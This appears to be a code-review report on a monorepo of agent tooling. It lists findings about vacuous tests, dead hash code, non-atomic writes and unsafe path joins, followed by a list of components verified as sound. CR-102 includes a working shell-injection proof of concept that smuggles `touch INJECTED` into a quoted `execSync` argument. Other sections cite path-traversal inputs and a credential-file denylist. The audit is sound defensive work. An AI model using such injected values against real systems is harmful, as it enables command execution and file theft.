### CR-099: Vacuous "sidechain" test asserts nothing sidechain-specific

**File:** `packages/memory/test/show.test.ts`
**Anchor:** `it("should indicate sidechains if present", ...)`
**Severity:** low

The test body is `expect(markdown).toBeTruthy()` on the same fixture used by five other tests in the file, with a comment admitting "For now we test the structure - will need a fixture with sidechains later." `toBeTruthy()` on a non-empty markdown string is guaranteed to pass regardless of whether sidechain rendering logic exists, is correct, or is deleted entirely. I grepped `packages/memory/test/` and found no fixture or test elsewhere that exercises `isSidechain: true` content through `formatConversationAsMarkdown`/`formatConversationAsHTML`. This means sidechain formatting in `show.ts` has no regression coverage anywhere in the suite despite a test that reads as if it provides some. Fix: add a fixture line with `isSidechain: true` and assert on the specific rendering (e.g., a sidechain marker/heading), or remove the test rather than leave a false signal of coverage.

### CR-100: Dead code computes SHA-512 of an empty string instead of the tarball's actual digest

**File:** `packages/mint/src/release/candidate.ts`
**Anchor:** `_pluginHashes`
**Severity:** low

Inside `prepareCandidate`, right after the tarballs are packed/downloaded:

```ts
const _pluginHashes = new Map(
  tarballMeta.map((t) => {
    const sha512 = createHash('sha512').update('').digest('hex')
    return [t.filename, { sha256: t.sha256, sha512 }] as const
  }),
)
```

`createHash('sha512').update('').digest('hex')` hashes the empty string, not the
tarball bytes — verified with `node -e "console.log(require('crypto').createHash('sha512').update('').digest('hex'))"`,
which always prints the well-known empty-SHA-512
(`cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e`)
regardless of `t`. Every entry in `_pluginHashes` therefore carries the same
wrong sha512 for every plugin, no matter what the real tarball contains.

This has no effect on the current release output only because the variable is
never read again (the underscore prefix is biome's `noUnusedVariables`
escape hatch — confirmed no other reference exists via
`grep -rn "_pluginHashes" packages/mint/src`). The real `SHA512SUMS` content is
built a few lines later through a different, correct path
(`packed.integrity` → base64 → hex). `buildTarballChecksumRows` in
`packages/mint/src/release/assets.ts` — the function this dead map's shape
exists to feed — is itself never called anywhere in `packages/mint/src`
(confirmed by grep), so this is vestigial scaffolding from an earlier
implementation.

Because the shape matches exactly what `buildTarballChecksumRows` expects, a
future edit that wires `_pluginHashes` back in (e.g. to replace the
integrity-derived `sha512Rows` computation, or dropping the leading
underscore to silence a lint pass) would silently corrupt every release's
`SHA512SUMS` file with a constant, content-independent digest. Delete the
dead map (and consider deleting `buildTarballChecksumRows`/`validateChecksumFile`
if truly unused) rather than leaving a plausible-looking but broken
computation next to the correct one.

### CR-101: `computeResumeActions` treats an unobserved draft-asset hash as a match, not as "unknown"

**File:** `packages/mint/src/release/recovery.ts`
**Anchor:** `computeResumeActions`
**Severity:** low

Inside the `changed` branch, once `snapshot.draftAssetPresent` is confirmed true, the function only
blocks with `RECOVERY_DRAFT_ASSET_MISMATCH` `if (snapshot.draftAssetSha256 !== undefined &&
snapshot.draftAssetSha256 !== tarballAsset.sha256)`. If the caller's registry/release-store inspection
is unable to report a hash for the draft asset (`draftAssetSha256` left `undefined` — it's declared
optional on `RegistrySnapshot`), the mismatch check is skipped entirely and the function falls through to
`{ kind: 'publish', ... }`, i.e. it treats "hash unknown" the same as "hash verified equal." A
same-named-but-different-content draft asset (e.g. a re-run that produced a different tarball for the
same filename) would be accepted for resume-publish without the integrity check the rest of the function
is built around. Since (per the finding above) this module currently has no production caller, this is
latent rather than actively exploitable, but it should be fixed before any caller is wired up: either
require `draftAssetSha256` to be non-optional on `RegistrySnapshot` (forcing every implementation to
either provide a real hash or explicitly report "absent"), or block with a distinct
`RECOVERY_DRAFT_ASSET_UNVERIFIABLE` code when the hash can't be observed, rather than silently accepting.

### CR-102: Unescaped shell interpolation of an environment-controlled path in the dogfood test

**File:** `packages/mint/test/dogfood.test.ts`
**Anchor:** `execSync(`git -C "${SUPERPOWERS_REPO}" archive HEAD | tar -x -C "${dir}"`)`
**Severity:** low

`SUPERPOWERS_REPO` is `process.env.MOE_MINT_DOGFOOD_REPO ?? DEFAULT_SUPERPOWERS_REPO` and is
interpolated directly into a shell string passed to `execSync` (which runs via `/bin/sh -c`
by default). A value containing a double quote followed by shell metacharacters breaks out
of the quoted argument and executes arbitrary shell commands in the test process.

Reproduced the breakout pattern directly (not just read):

```
node -e '
const { execSync } = require("node:child_process");
const evil = "x\"; touch INJECTED; echo \"";
execSync(`echo "${evil}"`);
'
```

This creates a file named `INJECTED` in the working directory, confirming the same
quoting shape used in `dogfood.test.ts` is exploitable whenever the interpolated value is
attacker-influenced.

In this test the value is gated by `existsSync(join(SUPERPOWERS_REPO, '.git'))` (the whole
`describe` block is `skipIf(!SUPERPOWERS_AVAILABLE)`), so a real exploit additionally
requires a directory with a `.git` subdirectory to exist at the crafted path — the
practical reachability is local-developer-only (this suite is explicitly gitignored/
skipped in CI). That bounds severity to low, but the fix is still worth making: replace the
interpolated `execSync` string with `execFileSync('git', ['-C', SUPERPOWERS_REPO, 'archive', 'HEAD'], ...)`
piped into `tar -x -C dir` (or use `execFileSync('tar', ['-x', '-C', dir], { input: archiveBuffer })`),
so the path is passed as an argv element rather than shell-interpolated text regardless of
its contents.

### CR-103: Publish-workflow permission test accepts a downgrade its own name forbids

**File:** `packages/mint/test/release-workflows.test.ts`
**Anchor:** `it('requires contents: write permission'` (publish workflow contract)
**Severity:** low

```js
it('requires contents: write permission', () => {
  const perms = PUBLISH_YAML.permissions
  expect(perms).toBeDefined()
  expect(perms.contents).toMatch(/write|read/)
})
```

The assertion accepts either `write` or `read`, so a future change that weakens `publish.yml`'s `permissions.contents` from `write` to `read` would still pass this test, despite the test's title explicitly claiming to require `write`. The sibling test in the same file for the certify workflow does this correctly:

```js
it('requires contents: write permission', () => {
  const perms = CERTIFY_YAML.permissions
  expect(perms.contents).toBe('write')
})
```

`publish.yml` currently declares `contents: write` (confirmed by reading the workflow directly), so there is no live defect today, but the test provides no protection against a regression that its name promises to catch. Fix: change the publish-workflow assertion to `expect(perms.contents).toBe('write')`, matching the certify-workflow test right below it.

### CR-104: `CostEstimate.per_model` mislabels `provider` when the same model string is billed under two different providers

**File:** `packages/tab/crates/moe-tab-core/src/cost.rs`
**Anchor:** `per_model.entry(u.model.clone()).or_insert_with(|| ModelCost { … provider: u.provider.clone() … })`
**Severity:** low

`per_model` is keyed only by the verbatim model string; the `ModelCost.provider`
field is set once, from whichever `MessageUsage` first inserts that key, and
every later record sharing the same `model` string merges its tokens/subtotal
into that entry without updating (or flagging a mismatch in) `provider`. ATIF
transcripts can legitimately report the same `model_name` under different
`extra.provider` tags in the same trajectory (e.g. one step tagged
`"anthropic"`, another left to `infer_provider` or tagged something else for
what the normalizer calls the same model string), so this is reachable through
normal parsing, not just a hand-crafted transcript.

Reproduced against the real crate: two `MessageUsage` records with
`model: "shared-model-name"`, one `Provider::Anthropic` and one
`Provider::OpenAI`, each carrying `native_cost_usd: Some(1.0)`. `cost::estimate`
produced a single `per_model` entry — `subtotal_usd` correctly summed to `2.0`
(the grand total is unaffected), but `provider` was reported as `Anthropic`,
silently dropping the fact that half of that dollar figure was actually billed
under OpenAI. Any downstream consumer that groups spend "by provider" from
this per-model breakdown (rather than re-deriving it from the raw usages) will
misattribute cost. Fix: key `per_model` by `(namespace, model, provider.label())`
(or at minimum change `provider` to a set/vec when it disagrees) instead of
model string alone.

### CR-105: `PriceStore::save` writes the snapshot in place, not atomically

**File:** `packages/tab/crates/moe-tab-core/src/pricing/store.rs`
**Anchor:** `std::fs::write(path, serde_json::to_vec_pretty(self)?)?;`
**Severity:** low

`save()` truncates and writes `path` directly rather than writing to a
sibling temp file and renaming into place. A process killed (OOM, SIGKILL,
power loss) mid-write — during `refresh_pricing_tables`'s second `save` to
`current.json`, or during any future caller of `save` — leaves a truncated,
non-JSON `current.json` on disk. Under the default (no explicit
`MOE_TAB_PRICING_DIR`) resolution path this degrades gracefully:
`resolve_store()` only uses the local snapshot `if let Ok(local) = …load(...)`
and silently falls back to the embedded floor on a parse error. But under an
explicit override, `resolve_store()` propagates the load error with `?`, so
every `estimate_cost` call errors loudly until the caller re-runs
`moe-tab refresh` — a real availability gap for a value that's supposed to be
`Local`'s "wins absolutely". A rename-based write (write to
`current.json.tmp`, `fsync`, `rename`) would make `save` crash-safe.

### CR-106: `transcript::detect` misclassifies a valid dialect file with more than 20 leading lines as `UnknownDialect`

**File:** `packages/tab/crates/moe-tab-core/src/transcript/mod.rs`
**Anchor:** `for line in text.lines().take(20)`
**Severity:** low

`detect()` looks for a `moe.tab.usage` claiming row only within the file's
first 20 *lines*, and blank lines count against that budget (the loop
`continue`s past them but the `take(20)` has already consumed the slot).
A `tab`-dialect file that happens to have more than 20 leading blank or
otherwise-non-claiming lines before its first real row — plausible from a
buffered writer that pre-allocates newline padding, or a sidecar that got a
burst of empty flushes — is never recognized, even though `tab::parse` would
parse it correctly once the dialect were known.

Reproduced against the real crate: a byte string of 25 newlines followed by
one well-formed `{"type":"moe.tab.usage", "v":"2026-06-08", …}` row returns
`Err(TabError::UnknownDialect)` from `moe_tab_core::transcript::detect`, not
`Ok(Dialect::Tab)`. Fix: skip blank lines before counting toward the 20-line
budget (mirror the loop body's `if line.is_empty() { continue; }` by not
consuming a slot for it), or scan a fixed byte budget instead of a fixed line
count.

### CR-107: `check_xml_valid`'s file lookup silently escapes the run/grade sandbox for absolute or `..`-containing paths

**File:** `py/proof/src/moe_proof/cli.py`
**Anchor:** `path = grade_dir / check["file"]`
**Severity:** low

`Path.__truediv__` treats a right-hand operand that is itself an absolute
path as a full replacement of the left-hand base (`Path("/a/b") /
"/etc/passwd" == Path("/etc/passwd")`), and a value like `"../../secret"`
walks out of `grade_dir`/`run_dir` entirely. `check["file"]` comes from the
grader YAML (author-controlled, not runtime/model-controlled data in this
codebase today), so this is not currently reachable by an adversarial model
output — but it is a footgun for anyone building tooling on top of graders
(e.g. templating a grader's `file:` value from task data) and it is
inconsistent with `execute_checker_program`'s comment two lines above
(`checker = (grader_dir / check["checker"]).resolve()` has the identical
issue for the `checker` path itself). Given the existing `is_relative_to`
containment pattern already used correctly in `site.py`'s `serve_eval`, the
same guard is missing here.

Fix: resolve the joined path and assert `is_relative_to(grade_dir)` /
`is_relative_to(run_dir)` before use, or reject `check["file"]` values that
are absolute or contain `..` segments.

## Checked and found sound

- `bin/moe.js`'s `resolve()` — sibling → PATH → workspace-fallback precedence,
  the win32 `.cmd`/`.exe`/`.bat`/bareword candidate order, the tab-specific
  `.exe` workspace fallback, and the directory-vs-file guards on both sibling
  and workspace candidates — traced against every case in
  `bin/test/moe.test.mjs` and confirms correctly with `pnpm exec vitest run
  --dir bin/test` (85/85 passing locally).
- `spawnAndForward`'s SIGINT/SIGTERM forwarding and signal→exit-code mapping,
  and its listener cleanup on both the `error` and `exit` child events (safe
  even if both somehow fire, since the surrounding Promise only resolves
  once).
- `selectHarness()`'s precedence (`--harness` > `MOE_DEFAULT_HARNESS` >
  sole-installed-executable) and its ambiguous/zero-installed error paths in
  `bin/lib/plugin-registry.mjs`, cross-checked against every
  `bin/moe-doctor`/`bin/moe-install` call site and their tests in
  `bin/test/doctor.test.mjs`.
- `executableOnPath`/`executableFile` in `bin/lib/probes.mjs` — PATH-splitting
  by platform delimiter, PATHEXT handling on win32, and the POSIX X_OK check —
  match the dedicated tests and the equivalent, independently-written
  resolver in `bin/moe.js`.
- `cmpVersion`, `extractVersion`, and `extractTmuxVersion` — verified the
  tuple comparison and the "no N.N.N triple in tmux output" rationale against
  real `tmux -V` output shapes cited in the comment.
- `tryExec`'s 2-second timeout with `SIGKILL` actually bounds a
  never-exiting child (confirmed by the "tryExec bounds a tool that never
  exits" test, which spawns a genuinely hanging Node process).
- Cross-checked every `plugin.pkg`/`plugin.config` pair in `PLUGINS` against
  the filesystem — all six `packages/<pkg>/<config>` mint yaml files exist.
- `automatedInstallActions`/`runActions` in `bin/moe-install` and the probe
  invocation in `bin/moe-doctor` — both use `execFileSync`/`spawnSync` with
  argument arrays (no shell), so neither is vulnerable to shell injection via
  harness names, repository URLs, or plugin names, all of which are drawn
  from the fixed in-repo registry rather than user input.

`packages/core/skills/smoothing-the-experience/scripts/lib/harnesses/claude.mjs` — `matchesPathPattern`'s glob translation (single `*` vs `**`, with/without a trailing slash) was exercised directly against `matchClaudePermission` for `Edit(dir/**)`, `Edit(dir/*)`, `Edit(**)`, and `Edit(*.txt)` against several candidate paths; single-star correctly refuses to cross a `/` boundary and double-star correctly does, matching the documented Claude settings glob semantics.

`packages/core/skills/brainstorming/scripts/server.cjs` — the local companion server's authentication path was read end to end: the session token is compared with `crypto.timingSafeEqual` on every request (query param and cookie), the cookie is set `HttpOnly; SameSite=Strict`, response headers set `X-Frame-Options: DENY` and a restrictive CSP, the WebSocket upgrade re-checks both the token and an `Origin` allowlist, `/files/` rejects dotfiles/symlinks/anything outside `CONTENT_DIR` via `realpathSync` comparison, and the port/token persistence files are written through `writeSecretFile`'s unlink-then-`wx` pattern specifically to defeat a pre-planted symlink. No gap found in this path.

`packages/core/skills/reviewing-a-codebase/scripts/review-scope.mjs` — the manifest's `denominator`/`not_selected`/`outside_denominator` fields were checked against their stated definitions (`denominator` is explicitly `selected.length`, computed once; `outside_denominator` is deliberately computed against `selected`, not the pre-shallow-narrowing `files` set, so it correctly captures everything the denominator does not count at every depth, including shallow-narrowed files). The symlink/regular-file guards around `--out` and the generated workspace files (`O_NOFOLLOW`, `lstatSync` checks before writing) were also read and are consistent.

`packages/core/scripts/validate_skill.py` — `parse_frontmatter`'s handling of a folded (`>`) block scalar and of a `description` value containing an internal `:` were both exercised directly (`python3 -c`) and produced the expected joined string and preserved-colon value respectively.

- `packages/core/skills/smoothing-the-experience/scripts/lib/safety/{shell,filesystem,network,mcp}.mjs` — reviewed the conservative-shell tokenizer/allowlist, the lexical+canonical path containment checks for filesystem evidence (including the `.ssh`/`.aws`/`.env`/`secrets` denylist), the public-hostname classifier (rejects IPs, `.local`/`.localhost`, globs, oversized labels), and the fixed MCP tool allowlist. All are deny-by-default and consistent with their exercising unit tests (`packages/core/test/smoothing-safety.test.ts`, run directly: 88/88 passing). Traced `classifyShell`'s callers (`rank.mjs`, `harnesses/claude.mjs`, `harnesses/codex.mjs`) to confirm these functions classify already-executed historical evidence for permission-rule suggestion, not live command dispatch, so the `cp -n` path's dependence on `realpathSync` succeeding post-execution is not a pre-flight race.
- `packages/core/skills/smoothing-the-experience/scripts/lib/mutation.mjs` — the bound-plan write path (`createBoundPlan`/`readBoundPlan`/`applyBoundPlan`) hashes and pins the full intent at plan-creation time, re-validates the on-disk source hash both before and after the caller's `validatePlan` callback (closing the TOCTOU window around that callback), takes an exclusive `wx`-mode lock file keyed to the destination, writes through a `wx`-created temp file with `fsync` + rename + post-write hash verification, and cleans up the temp file and any created parent directories on every failure path. Confirmed `writeSecretFile`-style symlink resistance is unnecessary here because the same `wx` semantics reject a pre-planted symlink at both the plan path and the temp-file path. Cross-checked against `packages/core/test/smoothing-mutation.test.ts` (run directly: passing) and `packages/core/skills/smoothing-the-experience/scripts/lib/harnesses/{claude,codex}.mjs` to confirm `plan.destination` is always harness-internal (derived from the resolved config directory), never attacker-suppliable through the `plan`/`apply` CLI surface.
- `packages/core/skills/smoothing-the-experience/scripts/smooth.mjs` — the `apply` verb re-runs a full `scan` (`validateSelectablePlan`) before mutating, so a plan can't be replayed after the underlying evidence/candidate set has moved; `--confirm` is bound to `intentSha256` so a stale or hand-edited plan is rejected. Argument parsing (`parseScanArgs`/`parsePlanArgs`/`parseApplyArgs`) rejects duplicate/unknown flags and validates `--days`, `--harness`, and permission-ID shape before use.
- `packages/core/skills/subagent-driven-development/scripts/task-set.mjs`, `packages/core/skills/writing-skills/render-graphs.mjs`, `packages/core/skills/working-with-claude-code/scripts/update_docs.cjs` — all spawn/exec without a shell (`execFileSync`/`spawnSync` with argv arrays), and `update_docs.cjs`'s filename handling (derived from fetched remote text) is already hardened against path escape with both a filename regex and a resolved-dirname check.
- `packages/core/skills/systematic-debugging/condition-based-waiting-example.ts` — illustrative skill documentation only; confirmed via `packages/core/tsconfig.tests.json` (`exclude: ["skills/**"]`) that it is deliberately outside this package's typecheck surface, so its import of a nonexistent `~/threads/thread-manager` module is not a build defect.
- `packages/core/test/brainstorm-server/*.test.cjs` (auth, branding, browser-launcher, helper, lifecycle, server, session-security, ws-protocol) — read in full and then executed directly (`node test/brainstorm-server/*.test.cjs`): all 122 individual test cases across these eight files pass against the current `server.cjs`/`helper.cjs`/`start-server.sh`. The auth suite's confused-deputy, cross-origin-WebSocket, and cookie/query-key precedence cases, and the session-security suite's symlink/hardlink and TOCTOU-style secret-file-write cases, all exercise real attack shapes rather than asserting tautologies.
- `packages/core/test/codebase-review-scripts.test.ts` and `packages/core/test/completion-evidence.test.ts` — read in full and executed directly with vitest (67/67 passing). The review-merge/verify-scope/verify-record tests correctly gate report emission on shard-report completeness, base-SHA agreement, and a closed verdict vocabulary with a per-finding base-matched ledger.
- `packages/core/test/ci-config.test.ts`, `packages/core/test/house-voice.test.ts`, `packages/core/test/house-voice/score.mjs` — executed directly with vitest (14/14 passing); the GitLab→GitHub Actions migration referenced in the file's comments is corroborated by `git log` (`b0ae97f6 ci: migrate from GitLab to GitHub Actions`, `78a772f6`), so the historical framing is accurate rather than stale.
- `packages/core/test/iterative-development/{test_artifact_validator,test_check_citations,test_chunk_spec,test_extraction_pipeline}.py` and `__init__.py` — executed directly with `unittest` (all passing) alongside `test_aggregate_stories.py`; no other issues found in these four files.

- `packages/core/test/metadata.test.ts` (101 tests, run via `pnpm vitest run`) — every skill-tree metadata invariant (name/description presence, no duplicate names, allowed frontmatter keys, cross-reference resolution, execute-bit allowlist in both directions, hooks.json shape, `plan-set`/`task-set` CLI behavior across many fixtures, licensing) passes at HEAD and the assertions are substantive, not tautological.
- `packages/core/test/smoothing-*.test.ts` (claude, codex, safety, mutation, ranking-rendering, evidence-discovery, cli-e2e, the-experience-contract — 8 files, ~230 tests total) — all pass. The suite exercises real production ESM helpers for permission classification, atomic file mutation with injected failure points at every step (lock-held, mid-write, mid-rename, post-rename hash mismatch), Codex App Server protocol handling with a fake subprocess, and a genuine end-to-end CLI harness that spawns the real `smooth.mjs` against isolated `HOME`/`CODEX_HOME` fixtures. Security-relevant assertions (secret redaction, SSRF-style hostname rejection, path traversal rejection, execpolicy witness requirements) are exercised with concrete negative cases.
- `packages/core/test/task-set-governance.test.ts`, `parallel-execution-contract.test.ts`, `retrieving-context-contract.test.ts`, `resolved-resource-quoting.test.ts`, `latte-corpus.test.ts`, `render-html.test.ts` — all pass; each is a well-scoped content/behavior pinning suite with real assertions against generated output.
- `packages/core/test/iterative-development/test_skill_validator.py` — ran via `python3 -m unittest`; 6/6 pass; fixtures referenced by the tests exist on disk.
- `packages/core/vitest.config.ts` — the `include: ["test/*.test.ts"]` glob matches the file comment's claim that nested suites (`test/iterative-development/`, `test/brainstorm-server/`, `test/shell/`, `test/latte/`) are deliberately excluded from the vitest run; confirmed no `.test.ts` file exists in a subdirectory that would be silently dropped by the non-recursive glob.
- `packages/crew/src/commands/adopt.ts`, `codex-launch.ts`, `context.ts`, `converse.ts`, `events-file.ts`, `grant-consent.ts`, `handoff.ts`, `list.ts`, `pack.ts`, `pi-launch.ts` — read in full; harness-conflict detection in `adopt.ts`'s `existingHarnessState`, the fail-fast validation order in `cmdPack`/`cmdPackStop`, and the derive-vs-assign send/resolve ordering in `converse.ts` are all internally consistent with their documented invariants. Traced `ctx.driver.transcriptPath(sid, meta.cwd, ctx.home)` in `converse.ts` against the codex/pi driver implementations to rule out a suspected stale-`HOME` bug: codex and pi ignore the `workerHome` parameter entirely and read `transcript_path` back from the self-registered meta, so passing the controller's real `HOME` there is harmless.

- `packages/crew/src/core/transcript.ts` — `parseClaudeTurn`/`parseCodexTurn`/`parsePiTurn` and the shared `renderTurn`. All three parsers degrade gracefully on malformed/partial JSONL lines and non-object blocks (verified the guard functions `asBlock`/`parseLines`/`parseRolloutLines`/`parsePiEntries` never throw on garbage input), and `collapseCodexResult`'s anchor-on-`Output:`-plus-exit-header logic passes text through unchanged when the expected markers are absent, so it never drops data on a format it doesn't recognize.
- `packages/crew/src/commands/send.ts` — the bracketed-paste ESC-stripping defense in `pasteText` (deleting every ESC byte rather than the two marker substrings) correctly closes the marker-splice case described in its own comment, since a bracketed-paste payload has no legitimate use for a raw ESC byte.
- `packages/crew/src/harness/codex.ts` — `tomlBasicString` correctly escapes backslash, double-quote, and all C0/DEL control characters for both the quoted table key and the string value, so a `cwd` or model containing `"`, `\`, or newlines cannot break out of the generated TOML.
- `packages/crew/src/core/worker-store.ts` — `stageCredentialFile`'s unlink-then-`O_EXCL|O_NOFOLLOW`-open sequence correctly prevents following a pre-planted symlink at the destination, and the destination directory's ownership is checked by `ensureOwnedDir` at the call sites before staging (independent of the TOCTOU gap noted above, which is about the *create* path, not this file-level defense).
- `packages/crew/src/core/paths.ts` — `assertSafeSegment`'s single-segment `[A-Za-z0-9_-]+` allowlist is applied consistently by every path-builder that keys off an untrusted worker name (`shimPath`, `workerHomePath`, `harnessMarkerPath`, `worktreeMarkerPath`), closing path traversal via `/`, `.`, or `..` in a worker name before it reaches the filesystem or the generated shim script.
- `packages/crew/src/harness/resolver.ts` — `resolveHarness`'s precedence chain correctly treats a present-but-invalid higher-precedence source as a hard error rather than falling through to a lower-precedence default, matching its documented contract that corrupt worker state must never disappear behind a valid fallback.

- `packages/crew/src/hooks/emit-event.ts` — `runHook`'s JSON-parse guard,
  managed-worker gate (`existsSync(metaPath(...))`), `EVENT_MAP` lookup,
  `buildEvent`'s per-event shape construction (cwd/tool/tool_input handling,
  including the `{}`-coercion of a non-object `tool_input`), the `Stop`
  hook's `{"decision":"approve"}` stdout contract, and `readStdin`'s
  5-second-timeout-with-no-hang behavior were all exercised by
  `test/emit-event.test.ts` and match the implementation; the derive/baked
  self-registration flow (write meta on first event, never overwrite on a
  later event) is covered for both the transcript-path-present and
  transcript-path-absent cases.
- `packages/crew/src/pi-extension/index.ts` — the six `pi.on` handler
  registrations, the WorkerEvent mapping for each (`session_start`,
  filtered `input`→`user_prompt_submit` on `source === "interactive"`,
  `tool_call`/`tool_result` via `canonicalToolName`, `agent_end`→`stop`,
  `session_shutdown` filtered to `reason === "quit"`), the
  `MOE_CREW_WORKER_DIR`-unset no-op path, and the "never overwrite an
  existing meta" guarantee are all covered by `test/pi-extension.test.ts`
  and match the code, including the malformed-event-payload resilience
  tests.
- Cross-checked `packages/crew/src/core/tool-name.ts`'s `canonicalToolName`
  against the pi-extension's call sites (`event.toolName` possibly
  `undefined` on a malformed test payload) — it tolerates non-string input
  by returning `""`, so it cannot be the source of an uncaught throw there.
- Read the broader test suite in this shard (`adopt.test.ts`,
  `await-start.test.ts`, `claude-driver.test.ts`, `cli.test.ts`,
  `codex-driver.test.ts`, `codex-launch.test.ts`, `consent.test.ts`,
  `converse.test.ts`, `diagnostics.test.ts`, `event-log*.test.ts`,
  `events*.test.ts`, `grant-consent.test.ts`, `handoff.test.ts`,
  `harness-resolution.test.ts`, `integration/*-flow.test.ts`,
  `launch.test.ts`, `list.test.ts`, `marketplace.test.ts`, `packs.test.ts`,
  `paths.test.ts`, `pi-driver.test.ts`) end to end. These exercise commands
  and drivers outside this shard's assigned source files (`adopt.ts`,
  `launch.ts`, `converse.ts`, the harness drivers, `runs.ts`, etc.) and did
  not surface an assertion that contradicted the behavior it was testing;
  no further action taken on that code since it is out of this shard's file
  list, but nothing in the test bodies themselves looked wrong.

- `packages/flight/dashboard/src/server.ts` `handleStatic` — the `/static/*`
  route was checked for path traversal. `join(STATIC_DIR, rest)` followed by
  `target.startsWith(normalizedRoot)` correctly rejects both literal `..`
  segments and pre-normalized `..` sequences that `new URL(...).pathname`
  collapses (verified with `node -e` against several encoded-dot and
  encoded-slash payloads: `%2e%2e` collapses at the `URL` parsing layer and
  no longer starts with `/static/`, so it 404s before reaching
  `handleStatic`; literal `%2f` survives `URL` parsing unresolved but is
  never decoded by `path.join`, so it cannot act as a path separator). The
  existence probe before `createReadStream` is deliberate and documented
  (`Bun.file` vs `createReadStream` failure-mode difference) and is correct.
- `packages/flight/dashboard/src/server.ts` `oneLine` / SSE framing — CR/LF
  stripping is applied to both the SSE `data:` body and the `event:` name
  (`publishCell`), which is the correct defense against a WHATWG
  `EventSource` frame-splitting injection from a scenario/agent/credential/os
  string that contains a raw CR or LF byte.
- `packages/crew/test/worker-store.test.ts` — the `ensureOwnedDir`,
  `stageCredentialFile`, and `removeWorker` suites exercise real adversarial
  filesystem shapes (symlink swapped in at the credential-staging
  destination, a `tmux_name` containing `../../` path-traversal, a plain file
  where a directory is expected) and assert the victim path is untouched in
  each case. These are load-bearing security tests and the assertions match
  what a correct implementation must do.
- `packages/crew/test/send.test.ts` — the two CR-017 regression tests
  (`strips paste markers embedded in the prompt`, `does not let deleting an
  embedded PASTE_START weld a live PASTE_END from the surrounding bytes`)
  correctly pin the specific "reconstructed escape sequence from adjacent
  survivor bytes" failure mode, not just a simple substring-strip case.
- `packages/flight/dashboard/src/manifest.ts` and `contracts.ts` — the
  read-side zod schemas correctly `.catch()`-guard every field that a
  malformed/legacy/externally-edited `verdict.json`/`grid-manifest.json`
  could break, and `loadGridManifest` wraps both `readFileSync` and
  `JSON.parse` in the same try/catch so a missing or malformed manifest
  degrades to `null` (results-only mode) rather than throwing out of
  `startDashboard`.
- `packages/crew/tsup.config.ts` — the CJS/ESM split and the manual
  `banner: { js: "#!/usr/bin/env node" }` on the CJS bundle is justified by a
  real, verifiable Windows cmd-shim failure mode (no shebang, no shim
  interpreter) and is not dead configuration.

- `packages/flight/dashboard/src/templates.ts` — `esc()` is a single-regex
  escaper over the five HTML metacharacters (deliberately not a
  `.replaceAll` chain, per its own comment, to satisfy a CodeQL sanitizer
  model), and every interpolated scenario/agent/run_id/cost/title string
  routed through `cellHtml`, `gridHtml`, and `cardHtml` is passed through it.
  Cross-checked against `dashboard-templates.test.ts`'s escaping assertions
  (ampersand-first ordering, quote escaping, card row `run_id`/`drift_line`
  escaping) and found consistent.
- `packages/flight/dashboard/test/dashboard-server.test.ts`'s CR/LF SSE
  injection test (`"a CR in a run's scenario cannot forge an extra SSE
  event/data pair"`) exercises exactly the class of injection risk that
  free-text identity fields reaching an `event:` line would otherwise create,
  and the assertion (`buf` must never contain `\r`) is a real, meaningful
  check, not a tautology.
- `packages/flight/src/qa/adapters/cli/adapter.ts` and
  `packages/flight/src/qa/adapters/tui/adapter.ts` — process lifecycle
  (`start`/`close`, descendant reaping with a grace window before SIGKILL,
  private per-session tmux servers to avoid inheriting a stale shared
  server's environment) reads correctly against their own doc comments. I
  reproduced the specific claim in `CLIAdapter`'s `readStream`/`pump` (a
  `.then()` chain with no `.catch()` reading from a child process stream)
  against a real `child_process.spawn` + `SIGKILL` sequence
  (`node repro-stream.mjs` in scratch), and confirmed no unhandled rejection
  is raised on an ordinary kill — the fire-and-forget promise chain is safe
  in practice, not a latent crash.
- `packages/flight/src/lab/tab/index.ts` (`mergeEstimates`,
  `estimateTrajectory`, `estimateUsageSidecar`) — the moe-tab boundary
  (`ObolError`→`TabError`, `'obol'`→`'tab'` dialect rename, mandatory
  `pricing_source`) is handled consistently with its own commentary, and the
  approximation/unpriced-model bookkeeping (tuple-keyed dedup, first-truthy
  `pricing_as_of`) matches its stated contract.
- `packages/flight/src/package-root.ts` — the package-root discovery walk
  correctly lands one level above `src/package-root.ts` from both `src/` and
  a built `dist/`, matching its documented invariant.
- `packages/flight/examples/todo/*` and
  `packages/flight/examples/tutorial/webapp/server.ts` are explicitly
  documented, intentionally-insecure fixtures ("Don't use this as a
  starter" / "DO NOT use this code as a template for a real app") — the
  absence of auth, CSRF protection, and rate limiting there is by design, not
  a defect.

- `packages/flight/src/qa/adapters/tui/capture-parser.ts` — the xterm-headless-backed `CaptureParser`: palette/cube/grayscale color math (`paletteColor`, `rgbHex`), wide-glyph width handling, and the absolute-cursor-positioning feed strategy for tmux `capture-pane -e` output were all checked against the documented xterm-256 cube/grayscale formulas and are correct.
- `packages/flight/src/qa/adapters/web/lib/html-diff.js` — the hand-rolled Myers diff and its `multisetDiff` fallback were exercised directly (`node -e` against `generateHtmlDiff`) for empty inputs, pure add/remove, and pure-reorder cases; all produced the documented output, including the "reorder is reported as del+add, not no-op" behavior the comments call out.
- `packages/flight/src/qa/adapters/web/lib/element-selector.js` — `parseContains`'s regex was exercised against a selector containing a `:contains(...)`-shaped substring inside an unrelated attribute value (`a[href="test:contains(x)"]:contains('y')`) and correctly anchored on the real trailing clause via backtracking, not the decoy.
- `packages/flight/src/qa/adapters/web/lib/browser-session.js` / `cdp-router.js` / `page-session.js` / `browser-bridge.js` — the sessionId-routing contract (root command responses vs. page-session responses vs. events) and the `ensureConnected()` memoized-connect logic were traced for the concurrent-caller race the comments call out (PRI-1690) and hold up: the synchronous assignment of `connectPromise` before any `await` prevents two back-to-back `ensureConnected()` calls from double-connecting.
- `packages/flight/src/qa/adapters/web/adapter.ts` and `cookies.ts` — tool dispatch, schema-validation caching, the tab-focus-stack fallback, and `install_cookies`'s YAML validation/error-ordering (unknown-field checks before required-field checks, cookie values excluded from evidence logging) all match their documented contracts.

- `packages/flight/src/qa/agent/validators.ts` — `parseReportResult`/`salvageReportResult`/`parseReportCriteria`/`checkCriteriaConsistency`/`validateToolArgs` all treat LLM output as fully untrusted, narrow it defensively, and give specific, actionable rejection reasons. The salvage path correctly preserves a valid core verdict while dropping only malformed observations (PRI-2140), and criteria-consistency correctly allows fail/investigate with all-passing criteria while rejecting an overall `pass` next to any non-pass criterion.
